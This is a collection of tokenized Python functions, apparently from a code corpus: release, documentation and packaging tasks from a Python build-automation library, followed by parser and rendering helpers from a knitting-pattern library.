def get_egg_info ( cfg , verbose = False ) : result = Bunch ( ) setup_py = cfg . rootjoin ( 'setup.py' ) if not os . path . exists ( setup_py ) : return result egg_info = shell . capture ( "python {} egg_info" . format ( setup_py ) , echo = True if verbose else None ) for info_line in egg_info . splitlines ( ) : if info_line . endswith ( 'PKG-INFO' ) : pkg_info_file = info_line . split ( None , 1 ) [ 1 ] result [ '__file__' ] = pkg_info_file with io . open ( pkg_info_file , encoding = 'utf-8' ) as handle : lastkey = None for line in handle : if line . lstrip ( ) != line : assert lastkey , "Bad continuation in PKG-INFO file '{}': {}" . format ( pkg_info_file , line ) result [ lastkey ] += '\n' + line else : lastkey , value = line . split ( ':' , 1 ) lastkey = lastkey . strip ( ) . lower ( ) . replace ( '-' , '_' ) value = value . strip ( ) if lastkey in result : try : result [ lastkey ] . append ( value ) except AttributeError : result [ lastkey ] = [ result [ lastkey ] , value ] else : result [ lastkey ] = value for multikey in PKG_INFO_MULTIKEYS : if not isinstance ( result . get ( multikey , [ ] ) , list ) : result [ multikey ] = [ result [ multikey ] ] return result
def bump ( ctx , verbose = False , pypi = False ) : cfg = config . load ( ) scm = scm_provider ( cfg . project_root , commit = False , ctx = ctx ) # Check for uncommitted changes if not scm . workdir_is_clean ( ) : notify . warning ( "You have uncommitted changes, will create a time-stamped version!" ) pep440 = scm . pep440_dev_version ( verbose = verbose , non_local = pypi ) # Rewrite 'setup.cfg'  TODO: refactor to helper, see also release-prep # with util.rewrite_file(cfg.rootjoin('setup.cfg')) as lines: #     ... setup_cfg = cfg . rootjoin ( 'setup.cfg' ) if not pep440 : notify . info ( "Working directory contains a release version!" ) elif os . path . exists ( setup_cfg ) : with io . open ( setup_cfg , encoding = 'utf-8' ) as handle : data = handle . readlines ( ) changed = False for i , line in enumerate ( data ) : if re . match ( r"#? *tag_build *= *.*" , line ) : verb , _ = data [ i ] . split ( '=' , 1 ) data [ i ] = '{}= {}\n' . format ( verb , pep440 ) changed = True if changed : notify . info ( "Rewriting 'setup.cfg'..." ) with io . open ( setup_cfg , 'w' , encoding = 'utf-8' ) as handle : handle . write ( '' . join ( data ) ) else : notify . warning ( "No 'tag_build' setting found in 'setup.cfg'!" ) else : notify . warning ( "Cannot rewrite 'setup.cfg', none found!" ) if os . path . exists ( setup_cfg ) : # Update metadata and print version egg_info = shell . capture ( "python setup.py egg_info" , echo = True if verbose else None ) for line in egg_info . splitlines ( ) : if line . endswith ( 'PKG-INFO' ) : pkg_info_file = line . split ( None , 1 ) [ 1 ] with io . open ( pkg_info_file , encoding = 'utf-8' ) as handle : notify . info ( '\n' . join ( i for i in handle . readlines ( ) if i . startswith ( 'Version:' ) ) . strip ( ) ) ctx . run ( "python setup.py -q develop" , echo = True if verbose else None )
def dist ( ctx , devpi = False , egg = False , wheel = False , auto = True ) : config . load ( ) cmd = [ "python" , "setup.py" , "sdist" ] # Automatically create wheels if possible if auto : egg = sys . version_info . major == 2 try : import wheel as _ wheel = True except ImportError : wheel = False if egg : cmd . append ( "bdist_egg" ) if wheel : cmd . append ( "bdist_wheel" ) ctx . run ( "invoke clean --all build --docs test check" ) ctx . run ( ' ' . join ( cmd ) ) if devpi : ctx . run ( "devpi upload dist/*" )
def pex ( ctx , pyrun = '' , upload = False , opts = '' ) : cfg = config . load ( ) # Build and check release ctx . run ( ": invoke clean --all build test check" ) # Get full version pkg_info = get_egg_info ( cfg ) # from pprint import pprint; pprint(dict(pkg_info)) version = pkg_info . version if pkg_info else cfg . project . version # Build a PEX for each console entry-point pex_files = [ ] # from pprint import pprint; pprint(cfg.project.entry_points) for script in cfg . project . entry_points [ 'console_scripts' ] : script , entry_point = script . split ( '=' , 1 ) script , entry_point = script . strip ( ) , entry_point . strip ( ) pex_file = cfg . rootjoin ( 'bin' , '{}-{}.pex' . format ( script , version ) ) cmd = [ 'pex' , '-r' , cfg . rootjoin ( 'requirements.txt' ) , cfg . project_root , '-c' , script , '-o' , pex_file ] if opts : cmd . append ( opts ) ctx . run ( ' ' . join ( cmd ) ) # Warn about non-portable stuff non_universal = set ( ) with closing ( zipfile . ZipFile ( pex_file , mode = "r" ) ) as pex_contents : for pex_name in pex_contents . namelist ( ) : # pylint: disable=no-member if pex_name . endswith ( 'WHEEL' ) and '-py2.py3-none-any.whl' not in pex_name : non_universal . add ( pex_name . split ( '.whl' ) [ 0 ] . split ( '/' ) [ - 1 ] ) if non_universal : notify . warning ( "Non-universal or native wheels in PEX '{}':\n    {}" . format ( pex_file . replace ( os . getcwd ( ) , '.' ) , '\n    ' . join ( sorted ( non_universal ) ) ) ) envs = [ i . split ( '-' ) [ - 3 : ] for i in non_universal ] envs = { i [ 0 ] : i [ 1 : ] for i in envs } if len ( envs ) > 1 : envs = { k : v for k , v in envs . items ( ) if not k . startswith ( 'py' ) } env_id = [ ] for k , v in sorted ( envs . items ( ) ) : env_id . append ( k ) env_id . extend ( v ) env_id = '-' . join ( env_id ) else : env_id = 'py2.py3-none-any' new_pex_file = pex_file . replace ( '.pex' , '-{}.pex' . format ( env_id ) ) notify . info ( "Renamed PEX to '{}'" . format ( os . path . basename ( new_pex_file ) ) ) os . rename ( pex_file , new_pex_file ) pex_file = new_pex_file pex_files . append ( pex_file ) if not pex_files : notify . warning ( "No entry points found in project configuration!" ) else : if pyrun : if any ( pyrun . startswith ( i ) for i in ( 'http://' , 'https://' , 'file://' ) ) : pyrun_url = pyrun else : pyrun_cfg = dict ( ctx . rituals . pyrun ) pyrun_cfg . update ( parse_qsl ( pyrun . replace ( os . pathsep , '&' ) ) ) pyrun_url = ( pyrun_cfg [ 'base_url' ] + '/' + pyrun_cfg [ 'archive' ] ) . format ( * * pyrun_cfg ) notify . info ( "Getting PyRun from '{}'..." . format ( pyrun_url ) ) with url_as_file ( pyrun_url , ext = 'tgz' ) as pyrun_tarball : pyrun_tar = tarfile . TarFile . gzopen ( pyrun_tarball ) for pex_file in pex_files [ : ] : pyrun_exe = pyrun_tar . extractfile ( './bin/pyrun' ) with open ( pex_file , 'rb' ) as pex_handle : pyrun_pex_file = '{}{}-installer.sh' . format ( pex_file [ : - 4 ] , pyrun_url . rsplit ( '/egenix' ) [ - 1 ] [ : - 4 ] ) with open ( pyrun_pex_file , 'wb' ) as pyrun_pex : pyrun_pex . write ( INSTALLER_BASH . replace ( '00000' , '{:<5d}' . format ( len ( INSTALLER_BASH ) + 1 ) ) ) shutil . copyfileobj ( pyrun_exe , pyrun_pex ) shutil . copyfileobj ( pex_handle , pyrun_pex ) shutil . copystat ( pex_file , pyrun_pex_file ) notify . info ( "Wrote PEX installer to '{}'" . format ( pretty_path ( pyrun_pex_file ) ) ) pex_files . append ( pyrun_pex_file ) if upload : base_url = ctx . rituals . release . upload . base_url . rstrip ( '/' ) if not base_url : notify . failure ( "No base URL provided for uploading!" ) for pex_file in pex_files : url = base_url + '/' + ctx . rituals . release . upload . path . lstrip ( '/' ) . format ( name = cfg . project . name , version = cfg . project . version , filename = os . path . basename ( pex_file ) ) notify . info ( "Uploading to '{}'..." . format ( url ) ) with io . open ( pex_file , 'rb' ) as handle : reply = requests . put ( url , data = handle . read ( ) ) if reply . status_code in range ( 200 , 300 ) : notify . info ( "{status_code} {reason}" . format ( * * vars ( reply ) ) ) else : notify . warning ( "{status_code} {reason}" . format ( * * vars ( reply ) ) )
def prep ( ctx , commit = True ) : cfg = config . load ( ) scm = scm_provider ( cfg . project_root , commit = commit , ctx = ctx ) # Check for uncommitted changes if not scm . workdir_is_clean ( ) : notify . failure ( "You have uncommitted changes, please commit or stash them!" ) # TODO Check that changelog entry carries the current date # Rewrite 'setup.cfg' setup_cfg = cfg . rootjoin ( 'setup.cfg' ) if os . path . exists ( setup_cfg ) : with io . open ( setup_cfg , encoding = 'utf-8' ) as handle : data = handle . readlines ( ) changed = False for i , line in enumerate ( data ) : if any ( line . startswith ( i ) for i in ( 'tag_build' , 'tag_date' ) ) : data [ i ] = '#' + data [ i ] changed = True if changed and commit : notify . info ( "Rewriting 'setup.cfg'..." ) with io . open ( setup_cfg , 'w' , encoding = 'utf-8' ) as handle : handle . write ( '' . join ( data ) ) scm . add_file ( 'setup.cfg' ) elif changed : notify . warning ( "WOULD rewrite 'setup.cfg', but --no-commit was passed" ) else : notify . warning ( "Cannot rewrite 'setup.cfg', none found!" ) # Update metadata and command stubs ctx . run ( 'python setup.py -q develop -U' ) # Build a clean dist and check version number version = capture ( 'python setup.py --version' ) ctx . run ( 'invoke clean --all build --docs release.dist' ) for distfile in os . listdir ( 'dist' ) : trailer = distfile . split ( '-' + version ) [ 1 ] trailer , _ = os . path . splitext ( trailer ) if trailer and trailer [ 0 ] not in '.-' : notify . failure ( "The version found in 'dist' seems to be" " a pre-release one! [{}{}]" . format ( version , trailer ) ) # Commit changes and tag the release scm . commit ( ctx . rituals . release . commit . message . format ( version = version ) ) scm . tag ( ctx . rituals . release . tag . name . format ( version = version ) , ctx . rituals . release . tag . message . format ( version = version ) )
def pylint ( ctx , skip_tests = False , skip_root = False , reports = False ) : cfg = config . load ( ) add_dir2pypath ( cfg . project_root ) if not os . path . exists ( cfg . testjoin ( '__init__.py' ) ) : add_dir2pypath ( cfg . testjoin ( ) ) namelist = set ( ) for package in cfg . project . get ( 'packages' , [ ] ) : if '.' not in package : namelist . add ( cfg . srcjoin ( package ) ) for module in cfg . project . get ( 'py_modules' , [ ] ) : namelist . add ( module + '.py' ) if not skip_tests : test_py = antglob . FileSet ( cfg . testdir , '**/*.py' ) test_py = [ cfg . testjoin ( i ) for i in test_py ] if test_py : namelist |= set ( test_py ) if not skip_root : root_py = antglob . FileSet ( '.' , '*.py' ) if root_py : namelist |= set ( root_py ) namelist = set ( [ i [ len ( os . getcwd ( ) ) + 1 : ] if i . startswith ( os . getcwd ( ) + os . sep ) else i for i in namelist ] ) cmd = 'pylint' cmd += ' "{}"' . format ( '" "' . join ( sorted ( namelist ) ) ) cmd += ' --reports={0}' . format ( 'y' if reports else 'n' ) for cfgfile in ( '.pylintrc' , 'pylint.rc' , 'pylint.cfg' , 'project.d/pylint.cfg' ) : if os . path . exists ( cfgfile ) : cmd += ' --rcfile={0}' . format ( cfgfile ) break try : shell . run ( cmd , report_error = False , runner = ctx . run ) notify . info ( "OK - No problems found by pylint." ) except exceptions . Failure as exc : # Check bit flags within pylint return code if exc . result . return_code & 32 : # Usage error (internal error in this code) notify . error ( "Usage error, bad arguments in {}?!" . format ( repr ( cmd ) ) ) raise else : bits = { 1 : "fatal" , 2 : "error" , 4 : "warning" , 8 : "refactor" , 16 : "convention" , } notify . warning ( "Some messages of type {} issued by pylint." . format ( ", " . join ( [ text for bit , text in bits . items ( ) if exc . result . return_code & bit ] ) ) ) if exc . result . return_code & 3 : notify . error ( "Exiting due to fatal / error message." ) raise
def tag ( self , label , message = None ) : options = ' -m "{}" -a' . format ( message ) if message else '' self . run_elective ( 'git tag{} "{}"' . format ( options , label ) )
def description ( _dummy_ctx , markdown = False ) : cfg = config . load ( ) markup = 'md' if markdown else 'html' description_file = cfg . rootjoin ( "build/project.{}" . format ( markup ) ) notify . banner ( "Creating {} file for Jenkins..." . format ( description_file ) ) long_description = cfg . project . long_description long_description = long_description . replace ( '\n\n' , '</p>\n<p>' ) long_description = re . sub ( r'(\W)``([^`]+)``(\W)' , r'\1<tt>\2</tt>\3' , long_description ) text = DESCRIPTION_TEMPLATES [ markup ] . format ( keywords = ', ' . join ( cfg . project . keywords ) , classifiers = '\n' . join ( cfg . project . classifiers ) , classifiers_indented = '    ' + '\n    ' . join ( cfg . project . classifiers ) , packages = ', ' . join ( cfg . project . packages ) , long_description_html = '<p>{}</p>' . format ( long_description ) , ##data='\n'.join(["%s=%r" % i for i in cfg.project.iteritems()]), * * cfg ) with io . open ( description_file , 'w' , encoding = 'utf-8' ) as handle : handle . write ( text )
def capture ( cmd , * * kw ) : kw = kw . copy ( ) kw [ 'hide' ] = 'out' if not kw . get ( 'echo' , False ) : kw [ 'echo' ] = False ignore_failures = kw . pop ( 'ignore_failures' , False ) try : return invoke_run ( cmd , * * kw ) . stdout . strip ( ) except exceptions . Failure as exc : if not ignore_failures : notify . error ( "Command `{}` failed with RC={}!" . format ( cmd , exc . result . return_code , ) ) raise
def run ( cmd , * * kw ) : kw = kw . copy ( ) kw . setdefault ( 'warn' , False ) # make extra sure errors don't get silenced report_error = kw . pop ( 'report_error' , True ) runner = kw . pop ( 'runner' , invoke_run ) try : return runner ( cmd , * * kw ) except exceptions . Failure as exc : sys . stdout . flush ( ) sys . stderr . flush ( ) if report_error : notify . error ( "Command `{}` failed with RC={}!" . format ( cmd , exc . result . return_code , ) ) raise finally : sys . stdout . flush ( ) sys . stderr . flush ( )
def provider ( workdir , commit = True , * * kwargs ) : return SCM_PROVIDER [ auto_detect ( workdir ) ] ( workdir , commit = commit , * * kwargs )
def fail ( message , exitcode = 1 ) : sys . stderr . write ( 'ERROR: {}\n' . format ( message ) ) sys . stderr . flush ( ) sys . exit ( exitcode )
def get_pypi_auth ( configfile = '~/.pypirc' ) : pypi_cfg = ConfigParser ( ) if pypi_cfg . read ( os . path . expanduser ( configfile ) ) : try : user = pypi_cfg . get ( 'pypi' , 'username' ) pwd = pypi_cfg . get ( 'pypi' , 'password' ) return user , pwd except ConfigError : notify . warning ( "No PyPI credentials in '{}'," " will fall back to '~/.netrc'..." . format ( configfile ) ) return None
def sphinx ( ctx , browse = False , clean = False , watchdog = False , kill = False , status = False , opts = '' ) : cfg = config . load ( ) if kill or status : if not watchdogctl ( ctx , kill = kill ) : notify . info ( "No process bound to port {}" . format ( ctx . rituals . docs . watchdog . port ) ) return if clean : ctx . run ( "invoke clean --docs" ) # Convert markdown files, if applicable for basename in ( 'README' , 'CONTRIBUTING' ) : markdown = cfg . rootjoin ( basename + '.md' ) if os . path . exists ( markdown ) : try : import pypandoc except ImportError as exc : notify . warning ( "Can't import 'pandoc' ({})" . format ( exc ) ) break else : pypandoc . convert ( markdown , 'rst' , outputfile = os . path . join ( ctx . rituals . docs . sources , basename + '.rst' ) ) # LICENSE file if os . path . exists ( 'LICENSE' ) : with io . open ( 'LICENSE' , 'r' ) as inp : license_text = inp . read ( ) try : _ , copyright_text = cfg . project [ 'long_description' ] . split ( 'Copyright' , 1 ) except ( KeyError , ValueError ) : copyright_text = cfg . project . get ( 'license' , 'N/A' ) with io . open ( os . path . join ( ctx . rituals . docs . sources , 'LICENSE.rst' ) , 'w' ) as out : out . write ( 'Software License\n' '================\n' '\n' '    Copyright {}\n' '\n' 'Full License Text\n' '-----------------\n' '\n' '::\n' '\n' . format ( copyright_text ) ) license_text = textwrap . dedent ( license_text ) license_text = '\n    ' . join ( license_text . splitlines ( ) ) out . write ( '    {}\n' . format ( license_text ) ) # Build API docs if cfg . project . get ( 'packages' ) and str ( ctx . rituals . docs . apidoc ) . lower ( ) [ : 1 ] in 't1y' : cmd = [ 'sphinx-apidoc' , '-o' , 'api' , '-f' , '-M' ] for package in cfg . project . packages : if '.' not in package : cmd . append ( cfg . srcjoin ( package ) ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) ) # Auto build? cmd = [ 'sphinx-build' , '-b' , 'html' ] if opts : cmd . append ( opts ) cmd . extend ( [ '.' , ctx . rituals . docs . build ] ) index_url = index_file = os . path . join ( ctx . rituals . docs . sources , ctx . rituals . docs . build , 'index.html' ) if watchdog : watchdogctl ( ctx , kill = True ) cmd [ 0 : 1 ] = [ 'nohup' , 'sphinx-autobuild' ] cmd . extend ( [ '-H' , ctx . rituals . docs . watchdog . host , '-p' , '{}' . format ( ctx . rituals . docs . watchdog . port ) , "-i'{}'" . format ( '*~' ) , "-i'{}'" . format ( '.*' ) , "-i'{}'" . format ( '*.log' ) , ">watchdog.log" , "2>&1" , "&" , ] ) index_url = "http://{}:{}/" . format ( ctx . rituals . docs . watchdog . host , ctx . rituals . docs . watchdog . port ) # Build docs notify . info ( "Starting Sphinx {}build..." . format ( 'auto' if watchdog else '' ) ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) , pty = not watchdog ) # Wait for watchdog to bind to listening port if watchdog : def activity ( what = None , i = None ) : "Helper" if i is None : sys . stdout . write ( what + '\n' ) else : sys . stdout . write ( ' {}  Waiting for {}\r' . format ( r'\|/-' [ i % 4 ] , what or 'something' ) ) sys . stdout . flush ( ) for i in range ( 60 ) : activity ( 'server start' , i ) if watchdogctl ( ctx ) : activity ( 'OK' ) break time . sleep ( 1 ) else : activity ( 'ERR' ) # trigger first build if os . path . exists ( os . path . join ( ctx . rituals . docs . sources , 'index.rst' ) ) : os . utime ( os . path . join ( ctx . rituals . docs . sources , 'index.rst' ) , None ) for i in range ( 60 ) : activity ( 'HTML index file' , i ) if os . path . exists ( index_file ) : activity ( 'OK' ) break time . sleep ( 1 ) else : activity ( 'ERR' ) # Open in browser? if browse : time . sleep ( 1 ) webbrowser . open_new_tab ( index_url )
def confluence ( ctx , no_publish = False , clean = False , opts = '' ) : cfg = config . load ( ) if clean : ctx . run ( "invoke clean --docs" ) cmd = [ 'sphinx-build' , '-b' , 'confluence' ] cmd . extend ( [ '-E' , '-a' ] ) # force a full rebuild if opts : cmd . append ( opts ) cmd . extend ( [ '.' , ctx . rituals . docs . build + '_cf' ] ) if no_publish : cmd . extend ( [ '-Dconfluence_publish=False' ] ) # Build docs notify . info ( "Starting Sphinx build..." ) with pushd ( ctx . rituals . docs . sources ) : ctx . run ( ' ' . join ( cmd ) , pty = True )
def _zipped ( self , docs_base ) : with pushd ( docs_base ) : with tempfile . NamedTemporaryFile ( prefix = 'pythonhosted-' , delete = False ) as ziphandle : pass zip_name = shutil . make_archive ( ziphandle . name , 'zip' ) notify . info ( "Uploading {:.1f} MiB from '{}' to '{}'..." . format ( os . path . getsize ( zip_name ) / 1024.0 , zip_name , self . target ) ) with io . open ( zip_name , 'rb' ) as zipread : try : yield zipread finally : os . remove ( ziphandle . name ) os . remove ( ziphandle . name + '.zip' )
def _to_pypi ( self , docs_base , release ) : url = None with self . _zipped ( docs_base ) as handle : reply = requests . post ( self . params [ 'url' ] , auth = get_pypi_auth ( ) , allow_redirects = False , files = dict ( content = ( self . cfg . project . name + '.zip' , handle , 'application/zip' ) ) , data = { ':action' : 'doc_upload' , 'name' : self . cfg . project . name } ) if reply . status_code in range ( 200 , 300 ) : notify . info ( "{status_code} {reason}" . format ( * * vars ( reply ) ) ) elif reply . status_code == 301 : url = reply . headers [ 'location' ] else : data = self . cfg . copy ( ) data . update ( self . params ) data . update ( vars ( reply ) ) notify . error ( "{status_code} {reason} for POST to {url}" . format ( * * data ) ) return url
def _to_webdav ( self , docs_base , release ) : try : git_path = subprocess . check_output ( 'git remote get-url origin 2>/dev/null' , shell = True ) except subprocess . CalledProcessError : git_path = '' else : git_path = git_path . decode ( 'ascii' ) . strip ( ) git_path = git_path . replace ( 'http://' , '' ) . replace ( 'https://' , '' ) . replace ( 'ssh://' , '' ) git_path = re . search ( r'[^:/]+?[:/](.+)' , git_path ) git_path = git_path . group ( 1 ) . replace ( '.git' , '' ) if git_path else '' url = None with self . _zipped ( docs_base ) as handle : url_ns = dict ( name = self . cfg . project . name , version = release , git_path = git_path ) reply = requests . put ( self . params [ 'url' ] . format ( * * url_ns ) , data = handle . read ( ) , headers = { 'Accept' : 'application/json' } ) if reply . status_code in range ( 200 , 300 ) : notify . info ( "{status_code} {reason}" . format ( * * vars ( reply ) ) ) try : data = reply . json ( ) except ValueError as exc : notify . warning ( "Didn't get a JSON response! ({})" . format ( exc ) ) else : if 'downloadUri' in data : # Artifactory url = data [ 'downloadUri' ] + '!/index.html' elif reply . status_code == 301 : url = reply . headers [ 'location' ] else : data = self . cfg . copy ( ) data . update ( self . params ) data . update ( vars ( reply ) ) notify . error ( "{status_code} {reason} for PUT to {url}" . format ( * * data ) ) if not url : notify . warning ( "Couldn't get URL from upload response!" ) return url
def upload ( self , docs_base , release ) : return getattr ( self , '_to_' + self . target ) ( docs_base , release )
def add_dir2pypath ( path ) : py_path = os . environ . get ( 'PYTHONPATH' , '' ) if path not in py_path . split ( os . pathsep ) : py_path = '' . join ( [ path , os . pathsep if py_path else '' , py_path ] ) os . environ [ 'PYTHONPATH' ] = py_path
def run ( self , cmd , * args , * * kwargs ) : runner = self . ctx . run if self . ctx else None return run ( cmd , runner = runner , * args , * * kwargs )
def run_elective ( self , cmd , * args , * * kwargs ) : if self . _commit : return self . run ( cmd , * args , * * kwargs ) else : notify . warning ( "WOULD RUN: {}" . format ( cmd ) ) kwargs = kwargs . copy ( ) kwargs [ 'echo' ] = False return self . run ( 'true' , * args , * * kwargs )
def info ( msg ) : _flush ( ) sys . stdout . write ( msg + '\n' ) sys . stdout . flush ( )
def warning ( msg ) : _flush ( ) sys . stderr . write ( "\033[1;7;33;40mWARNING: {}\033[0m\n" . format ( msg ) ) sys . stderr . flush ( )
def error ( msg ) : _flush ( ) sys . stderr . write ( "\033[1;37;41mERROR: {}\033[0m\n" . format ( msg ) ) sys . stderr . flush ( )
def get_devpi_url ( ctx ) : cmd = 'devpi use --urls' lines = ctx . run ( cmd , hide = 'out' , echo = False ) . stdout . splitlines ( ) for line in lines : try : line , base_url = line . split ( ':' , 1 ) except ValueError : notify . warning ( 'Ignoring "{}"!' . format ( line ) ) else : if line . split ( ) [ - 1 ] . strip ( ) == 'simpleindex' : return base_url . split ( '\x1b' ) [ 0 ] . strip ( ) . rstrip ( '/' ) raise LookupError ( "Cannot find simpleindex URL in '{}' output:\n    {}" . format ( cmd , '\n    ' . join ( lines ) , ) )
def get_project_root ( ) : try : tasks_py = sys . modules [ 'tasks' ] except KeyError : return None else : return os . path . abspath ( os . path . dirname ( tasks_py . __file__ ) )
def glob2re ( part ) : return "[^/]*" . join ( re . escape ( bit ) . replace ( r'\[\^' , '[^' ) . replace ( r'\[' , '[' ) . replace ( r'\]' , ']' ) for bit in part . split ( "*" ) )
def parse_glob ( pattern ) : if not pattern : return bits = pattern . split ( "/" ) dirs , filename = bits [ : - 1 ] , bits [ - 1 ] for dirname in dirs : if dirname == "**" : yield "(|.+/)" else : yield glob2re ( dirname ) + "/" yield glob2re ( filename )
def compile_glob ( spec ) : parsed = "" . join ( parse_glob ( spec ) ) regex = "^{0}$" . format ( parsed ) return re . compile ( regex )
def included ( self , path , is_dir = False ) : inclusive = None for pattern in self . patterns : if pattern . is_dir == is_dir and pattern . matches ( path ) : inclusive = pattern . inclusive #print('+++' if inclusive else '---', path, pattern) return inclusive
def build ( ctx , dput = '' , opts = '' ) : # Get package metadata with io . open ( 'debian/changelog' , encoding = 'utf-8' ) as changes : metadata = re . match ( r'^([^ ]+) \(([^)]+)\) ([^;]+); urgency=(.+)$' , changes . readline ( ) . rstrip ( ) ) if not metadata : notify . failure ( 'Badly formatted top entry in changelog' ) name , version , _ , _ = metadata . groups ( ) # Build package ctx . run ( 'dpkg-buildpackage {} {}' . format ( ctx . rituals . deb . build . opts , opts ) ) # Move created artifacts into "dist" if not os . path . exists ( 'dist' ) : os . makedirs ( 'dist' ) artifact_pattern = '{}?{}*' . format ( name , re . sub ( r'[^-_.a-zA-Z0-9]' , '?' , version ) ) changes_files = [ ] for debfile in glob . glob ( '../' + artifact_pattern ) : shutil . move ( debfile , 'dist' ) if debfile . endswith ( '.changes' ) : changes_files . append ( os . path . join ( 'dist' , os . path . basename ( debfile ) ) ) ctx . run ( 'ls -l dist/{}' . format ( artifact_pattern ) ) if dput : ctx . run ( 'dput {} {}' . format ( dput , ' ' . join ( changes_files ) ) )
def clean ( _dummy_ctx , docs = False , backups = False , bytecode = False , dist = False , # pylint: disable=redefined-outer-name all = False , venv = False , tox = False , extra = '' ) : # pylint: disable=redefined-builtin cfg = config . load ( ) notify . banner ( "Cleaning up project files" ) # Add patterns based on given parameters venv_dirs = [ 'bin' , 'include' , 'lib' , 'share' , 'local' , '.venv' ] patterns = [ 'build/' , 'pip-selfcheck.json' ] excludes = [ '.git/' , '.hg/' , '.svn/' , 'debian/*/' ] if docs or all : patterns . extend ( [ 'docs/_build/' , 'doc/_build/' ] ) if dist or all : patterns . append ( 'dist/' ) if backups or all : patterns . extend ( [ '**/*~' ] ) if bytecode or all : patterns . extend ( [ '**/*.py[co]' , '**/__pycache__/' , '*.egg-info/' , cfg . srcjoin ( '*.egg-info/' ) [ len ( cfg . project_root ) + 1 : ] , ] ) if venv : patterns . extend ( [ i + '/' for i in venv_dirs ] ) if tox : patterns . append ( '.tox/' ) else : excludes . append ( '.tox/' ) if extra : patterns . extend ( shlex . split ( extra ) ) # Build fileset patterns = [ antglob . includes ( i ) for i in patterns ] + [ antglob . excludes ( i ) for i in excludes ] if not venv : # Do not scan venv dirs when not cleaning them patterns . extend ( [ antglob . excludes ( i + '/' ) for i in venv_dirs ] ) fileset = antglob . FileSet ( cfg . project_root , patterns ) # Iterate over matches and remove them for name in fileset : notify . info ( 'rm {0}' . format ( name ) ) if name . endswith ( '/' ) : shutil . rmtree ( os . path . join ( cfg . project_root , name ) ) else : os . unlink ( os . path . join ( cfg . project_root , name ) )
def build ( ctx , docs = False ) : cfg = config . load ( ) ctx . run ( "python setup.py build" ) if docs : for doc_path in ( 'docs' , 'doc' ) : if os . path . exists ( cfg . rootjoin ( doc_path , 'conf.py' ) ) : break else : doc_path = None if doc_path : ctx . run ( "invoke docs" ) else : notify . warning ( "Cannot find either a 'docs' or 'doc' Sphinx directory!" )
def freeze ( ctx , local = False ) : cmd = 'pip --disable-pip-version-check freeze{}' . format ( ' --local' if local else '' ) frozen = ctx . run ( cmd , hide = 'out' ) . stdout . replace ( '\x1b' , '#' ) with io . open ( 'frozen-requirements.txt' , 'w' , encoding = 'ascii' ) as out : out . write ( "# Requirements frozen by 'pip freeze' on {}\n" . format ( isodate ( ) ) ) out . write ( frozen ) notify . info ( "Frozen {} requirements." . format ( len ( frozen . splitlines ( ) ) , ) )
def isodate ( datestamp = None , microseconds = False ) : datestamp = datestamp or datetime . datetime . now ( ) if not microseconds : usecs = datetime . timedelta ( microseconds = datestamp . microsecond ) datestamp = datestamp - usecs return datestamp . isoformat ( b' ' if PY2 else u' ' )
def _get_registered_executable ( exe_name ) : registered = None if sys . platform . startswith ( 'win' ) : if os . path . splitext ( exe_name ) [ 1 ] . lower ( ) != '.exe' : exe_name += '.exe' import _winreg # pylint: disable=import-error try : key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + exe_name value = _winreg . QueryValue ( _winreg . HKEY_LOCAL_MACHINE , key ) registered = ( value , "from HKLM\\" + key ) except _winreg . error : pass if registered and not os . path . exists ( registered [ 0 ] ) : registered = None return registered
def can_connect_to ( self , other ) : assert other . is_mesh ( ) disconnected = not other . is_connected ( ) and not self . is_connected ( ) types_differ = self . _is_consumed_mesh ( ) != other . _is_consumed_mesh ( ) return disconnected and types_differ
def _file ( self , file ) : if not self . __text_is_expected : file = BytesWrapper ( file , self . __encoding ) self . __dump_to_file ( file )
def _binary_file ( self , file ) : if self . __text_is_expected : file = TextWrapper ( file , self . __encoding ) self . __dump_to_file ( file )
def _path ( self , path ) : mode , encoding = self . _mode_and_encoding_for_open ( ) with open ( path , mode , encoding = encoding ) as file : self . __dump_to_file ( file )
def _set_pixel_and_convert_color ( self , x , y , color ) : if color is None : return color = self . _convert_color_to_rrggbb ( color ) self . _set_pixel ( x , y , color )
def _instructions_changed ( self , change ) : if change . adds ( ) : for index , instruction in change . items ( ) : if isinstance ( instruction , dict ) : in_row = self . _parser . instruction_in_row ( self , instruction ) self . instructions [ index ] = in_row else : instruction . transfer_to_row ( self )
def _dump_knitting_pattern ( self , file ) : knitting_pattern_set = self . __on_dump ( ) knitting_pattern = knitting_pattern_set . patterns . at ( 0 ) layout = GridLayout ( knitting_pattern ) builder = AYABPNGBuilder ( * layout . bounding_box ) builder . set_colors_in_grid ( layout . walk_instructions ( ) ) builder . write_to_file ( file )
def _start ( self ) : self . _instruction_library = self . _spec . new_default_instructions ( ) self . _as_instruction = self . _instruction_library . as_instruction self . _id_cache = { } self . _pattern_set = None self . _inheritance_todos = [ ] self . _instruction_todos = [ ]
def _finish_inheritance ( self ) : while self . _inheritance_todos : prototype , parent_id = self . _inheritance_todos . pop ( ) parent = self . _id_cache [ parent_id ] prototype . inherit_from ( parent )
def _finish_instructions ( self ) : while self . _instruction_todos : row = self . _instruction_todos . pop ( ) instructions = row . get ( INSTRUCTIONS , [ ] ) row . instructions . extend ( instructions )
def _fill_pattern_collection ( self , pattern_collection , values ) : pattern = values . get ( PATTERNS , [ ] ) for pattern_to_parse in pattern : parsed_pattern = self . _pattern ( pattern_to_parse ) pattern_collection . append ( parsed_pattern )
def _row ( self , values ) : row_id = self . _to_id ( values [ ID ] ) row = self . _spec . new_row ( row_id , values , self ) if SAME_AS in values : self . _delay_inheritance ( row , self . _to_id ( values [ SAME_AS ] ) ) self . _delay_instructions ( row ) self . _id_cache [ row_id ] = row return row
def _pattern ( self , base ) : rows = self . _rows ( base . get ( ROWS , [ ] ) ) self . _finish_inheritance ( ) self . _finish_instructions ( ) self . _connect_rows ( base . get ( CONNECTIONS , [ ] ) ) id_ = self . _to_id ( base [ ID ] ) name = base [ NAME ] return self . new_pattern ( id_ , name , rows )
def _rows ( self , spec ) : rows = self . new_row_collection ( ) for row in spec : rows . append ( self . _row ( row ) ) return rows
